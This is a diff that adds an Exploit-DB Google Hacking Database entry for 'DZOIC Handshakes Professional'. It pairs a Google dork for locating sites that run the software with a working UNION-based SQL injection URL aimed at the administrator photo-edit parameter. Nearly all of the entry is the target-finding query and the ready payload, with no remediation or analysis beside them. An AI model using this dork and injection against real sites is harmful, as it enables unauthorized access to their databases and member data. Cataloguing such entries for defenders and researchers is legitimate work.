@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3675
+Category:         Advisories and Vulnerabilities
+Published Date:   2011-01-20
+Author:           anonymous
+GoogleDork:       intext:"Powered by DZOIC Handshakes Professional"
+Description:      intext:"Powered by DZOIC Handshakes Professional"
+
+
+Author: IR-Security -Team SQL injection: http://server/administrator/index.php?section=manage_members&amp;action=edit_photo&amp;pho_id=-100001 union all select 1,version()--
